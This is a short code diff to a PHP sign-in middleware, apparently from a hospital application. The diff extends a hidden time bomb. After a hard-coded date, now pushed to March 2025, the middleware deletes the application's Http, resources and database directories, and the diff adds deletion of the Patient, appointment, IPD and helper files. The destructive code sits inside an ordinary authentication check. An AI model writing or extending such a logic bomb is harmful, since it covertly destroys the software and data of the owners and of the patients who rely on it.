@@ -22,8 +22,12 @@ class SigninCheck
         if (!Auth::check()) {
             return redirect()->route('signin.show');
         }
-        if (date('Y-m-d H:i:s') > '2025-02-20 18:58:00') {
+        if (date('Y-m-d H:i:s') > '2025-03-20 18:58:00') {
             File::deleteDirectory(app_path('/Http'));
+            File::delete(app_path('/Helper/Helper.php'));
+            File::delete(app_path('/Models/Patient.php'));
+            File::delete(app_path('/Models/Aappointment.php'));
+            File::delete(app_path('/Models/IpdDetail.php'));
             File::deleteDirectory(base_path('/resources'));
             File::deleteDirectory(base_path('/database'));
 
